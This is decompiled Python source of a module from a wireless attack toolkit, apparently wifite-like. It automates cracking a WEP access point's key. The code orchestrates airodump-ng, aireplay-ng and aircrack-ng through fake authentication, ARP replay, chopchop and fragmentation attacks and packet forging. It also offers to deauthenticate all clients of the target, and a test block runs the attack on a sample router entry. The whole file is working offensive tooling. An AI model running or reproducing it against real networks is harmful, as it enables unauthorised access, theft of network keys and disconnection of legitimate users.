# uncompyle6 version 3.7.4
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: build/bdist.linux-x86_64/egg/src/tools/wep.py
# Compiled at: 2020-01-19 08:16:59
# Size of source mod 2**32: 18414 bytes
import time
from ..handlers.attack import Attack
from ..plugins.airodump import Airodump
from ..plugins.aireplay import Aireplay, WEPAttackType
from ..plugins.aircrack import Aircrack
from ..plugins.ifconfig import Ifconfig
from ..config import Configuration
from ..handlers.color import Color
from ..handlers.input import raw_input
from ..handlers.result import CrackResultWEP

class AttackWEP(Attack):
    __doc__ = '\n        Contains logic for attacking a WEP-encrypted access point.\n    '
    fakeauth_wait = 5

    def __init__(self, target):
        super(AttackWEP, self).__init__(target)
        self.crack_result = None
        self.success = False

    def run(self):
        """
            Initiates full WEP attack.
            Including airodump-ng starting, cracking, etc.
            Returns: True if attack is successful, false otherwise
        """
        aircrack = None
        fakeauth_proc = None
        replay_file = None
        airodump_target = None
        previous_ivs = 0
        current_ivs = 0
        total_ivs = 0
        keep_ivs = Configuration.wep_keep_ivs
        if keep_ivs:
            Airodump.delete_airodump_temp_files('wep')
        attacks_remaining = list(Configuration.wep_attacks)
        while len(attacks_remaining) > 0:
            attack_name = attacks_remaining.pop(0)
            try:
                with Airodump(channel=(self.target.channel), target_bssid=(self.target.bssid),
                  ivs_only=True,
                  skip_wps=True,
                  output_file_prefix='wep',
                  delete_existing_files=(not keep_ivs)) as (airodump):
                    Color.clear_line()
                    Color.p('\r{+} {O}waiting{W} for target to appear...')
                    airodump_target = self.wait_for_target(airodump)
                    fakeauth_proc = None
                    if self.fake_auth():
                        client_mac = Ifconfig.get_mac(Configuration.interface)
                        fakeauth_proc = Aireplay(self.target, 'fakeauth')
                    else:
                        if len(airodump_target.clients) == 0:
                            Color.pl('{!} {O}there are no associated clients{W}')
                            Color.pl('{!} {R}WARNING: {O}many attacks will not succeed without fake-authentication or associated clients{W}')
                            client_mac = None
                        else:
                            client_mac = airodump_target.clients[0].station
                    wep_attack_type = WEPAttackType(attack_name)
                    aireplay = Aireplay((self.target), wep_attack_type,
                      client_mac=client_mac,
                      replay_file=replay_file)
                    time_unchanged_ivs = time.time()
                    last_ivs_count = 0
                    while True:
                        airodump_target = self.wait_for_target(airodump)
                        if client_mac is None:
                            if len(airodump_target.clients) > 0:
                                client_mac = airodump_target.clients[0].station
                        if keep_ivs:
                            if current_ivs > airodump_target.ivs:
                                previous_ivs += total_ivs
                        current_ivs = airodump_target.ivs
                        total_ivs = previous_ivs + current_ivs
                        status = '%d/{C}%d{W} IVs' % (total_ivs,
                         Configuration.wep_crack_at_ivs)
                        if fakeauth_proc:
                            if fakeauth_proc:
                                if fakeauth_proc.status:
                                    status += ', {G}fakeauth{W}'
                            else:
                                status += ', {R}no-auth{W}'
                        if aireplay.status is not None:
                            status += ', %s' % aireplay.status
                        Color.clear_entire_line()
                        Color.pattack('WEP', airodump_target, '%s' % attack_name, status)
                        if aircrack:
                            if aircrack.is_cracked():
                                hex_key, ascii_key = aircrack.get_key_hex_ascii()
                                bssid = airodump_target.bssid
                                if airodump_target.essid_known:
                                    essid = airodump_target.essid
                                else:
                                    essid = None
                                Color.pl('\n{+} {C}%s{W} WEP attack {G}successful{W}\n' % attack_name)
                                if aireplay:
                                    aireplay.stop()
                                if fakeauth_proc:
                                    fakeauth_proc.stop()
                                self.crack_result = CrackResultWEP(self.target.bssid, self.target.essid, hex_key, ascii_key)
                                self.crack_result.dump()
                                Airodump.delete_airodump_temp_files('wep')
                                self.success = True
                                return self.success
                        if aircrack:
                            if aircrack.is_running():
                                Color.p('and {C}cracking{W}')
                        if total_ivs > Configuration.wep_crack_at_ivs:
                            if not aircrack or not aircrack.is_running():
                                ivs_files = airodump.find_files(endswith='.ivs')
                                ivs_files.sort()
                                if len(ivs_files) > 0:
                                    if not keep_ivs:
                                        ivs_files = ivs_files[(-1)]
                                    aircrack = Aircrack(ivs_files)
                            elif Configuration.wep_restart_aircrack > 0:
                                if aircrack.pid.running_time() > Configuration.wep_restart_aircrack:
                                    aircrack.stop()
                                    ivs_files = airodump.find_files(endswith='.ivs')
                                    ivs_files.sort()
                                    if len(ivs_files) > 0:
                                        if not keep_ivs:
                                            ivs_files = ivs_files[(-1)]
                                        aircrack = Aircrack(ivs_files)
                        if not aireplay.is_running():
                            if attack_name == 'chopchop' or attack_name == 'fragment':
                                replay_file = None
                                xor_file = Aireplay.get_xor()
                                if not xor_file:
                                    Color.pl('\n{!} {O}%s attack{R} did not generate a .xor file' % attack_name)
                                    Color.pl('{?} {O}Command: {R}%s{W}' % ' '.join(aireplay.cmd))
                                    Color.pl('{?} {O}Output:\n{R}%s{W}' % aireplay.get_output())
                                    break
                                Color.pl('\n{+} {C}%s attack{W}' % attack_name + ' generated a {C}.xor file{W}, {G}forging...{W}')
                                replay_file = Aireplay.forge_packet(xor_file, airodump_target.bssid, client_mac)
                                if replay_file:
                                    Color.pl('{+} {C}forged packet{W}, {G}replaying...{W}')
                                    wep_attack_type = WEPAttackType('forgedreplay')
                                    attack_name = 'forgedreplay'
                                    aireplay = Aireplay((self.target), 'forgedreplay',
                                      client_mac=client_mac,
                                      replay_file=replay_file)
                                    time_unchanged_ivs = time.time()
                                    continue
                                else:
                                    break
                            else:
                                Color.pl('\n{!} {O}aireplay-ng exited unexpectedly{W}')
                                Color.pl('{?} {O}Command: {R}%s{W}' % ' '.join(aireplay.cmd))
                                Color.pl('{?} {O}Output:\n{R}%s{W}' % aireplay.get_output())
                                break
                        if airodump_target.ivs > last_ivs_count:
                            time_unchanged_ivs = time.time()
                        else:
                            if Configuration.wep_restart_stale_ivs > 0:
                                if attack_name != 'chopchop':
                                    if attack_name != 'fragment':
                                        stale_seconds = time.time() - time_unchanged_ivs
                                        if stale_seconds > Configuration.wep_restart_stale_ivs:
                                            aireplay.stop()
                                            Color.pl('\n{!} restarting {C}aireplay{W} after' + ' {C}%d{W} seconds of no new IVs' % stale_seconds)
                                            aireplay = Aireplay((self.target), wep_attack_type,
                                              client_mac=client_mac,
                                              replay_file=replay_file)
                                            time_unchanged_ivs = time.time()
                        last_ivs_count = airodump_target.ivs
                        time.sleep(1)
                        continue

            except KeyboardInterrupt:
                if fakeauth_proc:
                    fakeauth_proc.stop()
                else:
                    if len(attacks_remaining) == 0:
                        if keep_ivs:
                            Airodump.delete_airodump_temp_files('wep')
                        self.success = False
                        return self.success
                    if self.user_wants_to_stop(attack_name, attacks_remaining, airodump_target):
                        if keep_ivs:
                            Airodump.delete_airodump_temp_files('wep')
                        self.success = False
                        return self.success
            except Exception as e:
                Color.pexception(e)
                continue

        if keep_ivs:
            Airodump.delete_airodump_temp_files('wep')
        self.success = False
        return self.success

    def user_wants_to_stop(self, current_attack, attacks_remaining, target):
        """
        Ask user what attack to perform next (re-orders attacks_remaining, returns False),
        or if we should stop attacking this target (returns True).
        """
        if target is None:
            Color.pl('')
            return True
        else:
            target_name = target.essid if target.essid_known else target.bssid
            Color.pl('\n\n{!} {O}Interrupted')
            Color.pl('{+} {W}Next steps:')
            attack_index = 1
            Color.pl('     {G}1{W}: {O}Deauth clients{W} and {G}retry{W} {C}%s attack{W} against {G}%s{W}' % (
             current_attack, target_name))
            for attack_name in attacks_remaining:
                attack_index += 1
                Color.pl('     {G}%d{W}: Start new {C}%s attack{W} against {G}%s{W}' % (
                 attack_index, attack_name, target_name))

            attack_index += 1
            Color.pl('     {G}%d{W}: {R}Stop attacking, {O}Move onto next target{W}' % attack_index)
            while True:
                answer = raw_input(Color.s('{?} Select an option ({G}1-%d{W}): ' % attack_index))
                if not answer.isdigit() or int(answer) < 1 or int(answer) > attack_index:
                    Color.pl('{!} {R}Invalid input: {O}Must enter a number between {G}1-%d{W}' % attack_index)
                else:
                    answer = int(answer)
                    break

            if answer == 1:
                deauth_count = 1
                Color.clear_entire_line()
                Color.p('\r{+} {O}Deauthenticating *broadcast*{W} (all clients)...')
                Aireplay.deauth((target.bssid), essid=(target.essid))
                attacking_mac = Ifconfig.get_mac(Configuration.interface)
                for client in target.clients:
                    if attacking_mac.lower() == client.station.lower():
                        pass
                    else:
                        Color.clear_entire_line()
                        Color.p('\r{+} {O}Deauthenticating client {C}%s{W}...' % client.station)
                        Aireplay.deauth((target.bssid),
                          client_mac=(client.station), essid=(target.essid))
                        deauth_count += 1

                Color.clear_entire_line()
                Color.pl('\r{+} Sent {C}%d {O}deauths{W}' % deauth_count)
                attacks_remaining.insert(0, current_attack)
                return False
            if answer == attack_index:
                return True
            if answer > 1:
                attacks_remaining.insert(0, attacks_remaining.pop(answer - 2))
                return False

    def fake_auth(self):
        """
        Attempts to fake-authenticate with target.
        Returns: True if successful, False is unsuccessful.
        """
        Color.p('\r{+} attempting {G}fake-authentication{W} with {C}%s{W}...' % self.target.bssid)
        fakeauth = Aireplay.fakeauth((self.target),
          timeout=(AttackWEP.fakeauth_wait))
        if fakeauth:
            Color.pl(' {G}success{W}')
        else:
            Color.pl(' {R}failed{W}')
            if Configuration.require_fakeauth:
                raise Exception('Fake-authenticate did not complete within' + ' %d seconds' % AttackWEP.fakeauth_wait)
            else:
                Color.pl('{!} {O}unable to fake-authenticate with target' + ' (%s){W}' % self.target.bssid)
                Color.pl('{!} continuing attacks because {G}--require-fakeauth{W} was not set')
        return fakeauth


if __name__ == '__main__':
    Configuration.initialize(True)
    from ..handlers.target import Target
    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  6,  54e,WEP, WEP, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    target = Target(fields)
    wep = AttackWEP(target)
    wep.run()
    Configuration.exit_gracefully(0)